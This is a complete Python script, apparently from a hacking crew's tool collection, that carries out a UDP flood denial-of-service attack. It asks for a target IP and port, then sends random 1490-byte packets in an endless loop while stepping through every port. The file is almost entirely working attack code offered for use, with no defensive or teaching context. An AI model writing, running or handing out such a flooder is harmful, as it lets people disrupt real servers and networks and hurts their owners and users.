#!/system/bin/python
# Fl00d 2.0 27-06-2017 (1:42)
# Tool for UDP Flood
# Authorized by DedSecTL
# AndroSec1337 Cyber Team
import socket, os, random, time

# Color
B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

# Code time ##################
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
##############################

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
print(B + "_________-----_____")
print("       _____------           __      -----")
print("___----             ___------              \\")
print("   ----________        ----                 \\")
print("               -----__    |             _____)")
print("                    __-                /     \\")
print("        _______-----    ___--          \\    /)\\")
print("  ------_______      ---____            \\__/  /")
print("               -----__    \\ --    _          /\\")
print("                      --__--__     \\_____/   \\_/\\")
print("                              ----|   /          |")
print("                                  |  |___________|")
print("                                  |  | ((_(_)| )_)")
print("                                  |  \\_((_(_)|/(_)")
print("                                  \\             (")
print("                                   \\_____________)")
print()
ip = input('[$] T@rget 1P: ')
port = int(input('[$] P0rt: '))
os.system("clear")
print("Attack Inciando PYETRO FUDENDO TUDO {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year))
time.sleep(3)
print()
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
    if port == 65534:
        port = 1
